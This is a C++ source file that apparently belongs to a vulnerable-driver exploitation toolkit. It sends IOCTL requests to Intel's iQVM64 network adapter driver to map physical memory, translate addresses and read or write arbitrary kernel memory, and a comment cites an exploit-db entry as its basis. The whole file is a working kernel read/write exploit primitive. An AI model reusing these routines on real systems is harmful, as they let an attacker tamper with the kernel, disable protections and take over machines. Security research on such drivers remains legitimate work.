/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       NAL.CPP
*
*  VERSION:     1.10
*
*  DATE:        15 Apr 2021
*
*  Intel Network Adapter iQVM64 driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/nal.h"

//
// Based on https://www.exploit-db.com/exploits/36392
//

/*
* NalCallDriver
*
* Purpose:
*
* Call Intel Nal driver.
*
*/
BOOL NalCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ PVOID Buffer,
    _In_ ULONG Size)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IOCTL_NAL_MANAGE,
        Buffer,
        Size,
        NULL,
        0);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* NalMapAddressEx
*
* Purpose:
*
* Call MmMapIoSpace via Nal driver, return kernel mode virtual address.
*
*/
BOOL NalMapAddressEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_ ULONG_PTR* VirtualAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    NAL_MAP_IO_SPACE request;

    if (VirtualAddress)
        *VirtualAddress = 0;
    else
        return FALSE;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_MAPIOSPACE;
    request.PhysicalAddress = PhysicalAddress;
    request.NumberOfBytes = NumberOfBytes;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        if (request.OpResult == 0) {
            *VirtualAddress = request.VirtualAddress;
            bResult = TRUE;
        }
        else {
            SetLastError(ERROR_INTERNAL_ERROR);
        }
    }

    return bResult;
}

/*
* NalUnmapAddress
*
* Purpose:
*
* Call MmUnmapIoSpace via Nal driver.
*
*/
BOOL NalUnmapAddress(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    NAL_UNMAP_IO_SPACE request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_UNMAPIOSPACE;
    request.VirtualAddress = VirtualAddress;
    request.NumberOfBytes = NumberOfBytes;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        bResult = (request.OpResult == 0);
        if (bResult == FALSE) {
            SetLastError(ERROR_NONE_MAPPED);
        }
    }

    return bResult;
}

/*
* NalVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
* N.B.
* Call driver Intel Nal driver MmGetVirtualForPhysical switch case.
*
*/
BOOL WINAPI NalVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    BOOL bResult = FALSE;
    NAL_GET_PHYSICAL_ADDRESS request;

    if (PhysicalAddress)
        *PhysicalAddress = 0;
    else {
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    RtlSecureZeroMemory(&request, sizeof(request));
    request.Header.FunctionId = NAL_FUNCID_VIRTUALTOPHYSCAL;
    request.VirtualAddress = VirtualAddress;

    if (NalCallDriver(DeviceHandle, &request, sizeof(request))) {
        *PhysicalAddress = request.PhysicalAddress;
        bResult = TRUE;
    }

    return bResult;
}

/*
* NalReadVirtualMemory
*
* Purpose:
*
* Read virtual memory via Nal memmove switch case.
*
*/
_Success_(return != FALSE)
BOOL NalReadVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;

    PVOID lockedBuffer = (PVOID)VirtualAlloc(NULL, NumberOfBytes, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lockedBuffer) {

        if (VirtualLock(lockedBuffer, NumberOfBytes)) {

            RtlSecureZeroMemory(&request, sizeof(request));
            request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
            request.SourceAddress = VirtualAddress;
            request.DestinationAddress = (ULONG_PTR)lockedBuffer;
            request.Length = NumberOfBytes;

            bResult = NalCallDriver(DeviceHandle, &request, sizeof(request));
            if (bResult) {
                RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
            }
            else {
                dwError = GetLastError();
            }

            VirtualUnlock(lockedBuffer, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

        VirtualFree(lockedBuffer, 0, MEM_RELEASE);
    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* NalWriteVirtualMemory
*
* Purpose:
*
* Write virtual memory via Nal memmove switch case.
*
*/
_Success_(return != FALSE)
BOOL NalWriteVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    NAL_MEMMOVE request;

    PVOID lockedBuffer = (PVOID)VirtualAlloc(NULL, NumberOfBytes, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lockedBuffer) {

        RtlCopyMemory(lockedBuffer, Buffer, NumberOfBytes);

        if (VirtualLock(lockedBuffer, NumberOfBytes)) {

            RtlSecureZeroMemory(&request, sizeof(request));
            request.Header.FunctionId = NAL_FUNCID_MEMMOVE;
            request.SourceAddress = (ULONG_PTR)lockedBuffer;
            request.DestinationAddress = VirtualAddress;
            request.Length = NumberOfBytes;

            bResult = NalCallDriver(DeviceHandle, &request, sizeof(request));
            if (bResult == FALSE) {
                dwError = GetLastError();
            }

            VirtualUnlock(lockedBuffer, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

        VirtualFree(lockedBuffer, 0, MEM_RELEASE);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* NalWriteVirtualMemory
*
* Purpose:
*
* Write to virtual memory via mapping.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NalWriteVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    ULONG_PTR physAddress, mappedVirt;

    if (NalVirtualToPhysical(DeviceHandle, VirtualAddress, &physAddress)) {

        if (NalMapAddressEx(DeviceHandle, physAddress, &mappedVirt, NumberOfBytes)) {

            bResult = NalWriteVirtualMemory(DeviceHandle, mappedVirt, Buffer, NumberOfBytes);
            if (bResult == FALSE)
                dwError = GetLastError();

            NalUnmapAddress(DeviceHandle, mappedVirt, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

    }
    else {
        dwError = GetLastError();
    }
    SetLastError(dwError);
    return bResult;
}

/*
* NalReadVirtualMemoryEx
*
* Purpose:
*
* Read virtual memory via mapping.
*
*/
_Success_(return != FALSE)
BOOL WINAPI NalReadVirtualMemoryEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID lockedBuffer = (PVOID)VirtualAlloc(NULL, NumberOfBytes, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lockedBuffer) {

        if (VirtualLock(lockedBuffer, NumberOfBytes)) {

            ULONG_PTR physicalAddress, newVirt;

            if (NalVirtualToPhysical(DeviceHandle, VirtualAddress, &physicalAddress)) {
                if (NalMapAddressEx(DeviceHandle, physicalAddress, &newVirt, NumberOfBytes)) {

                    bResult = NalReadVirtualMemory(DeviceHandle, newVirt, lockedBuffer, NumberOfBytes);
                    if (bResult) {
                        RtlCopyMemory(Buffer, lockedBuffer, NumberOfBytes);
                    }
                    else {
                        dwError = GetLastError();
                    }

                    NalUnmapAddress(DeviceHandle, newVirt, NumberOfBytes);
                }
            }
            else {
                dwError = GetLastError();
            }

            VirtualUnlock(lockedBuffer, NumberOfBytes);
        }
        else {
            dwError = GetLastError();
        }

        VirtualFree(lockedBuffer, 0, MEM_RELEASE);
    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}
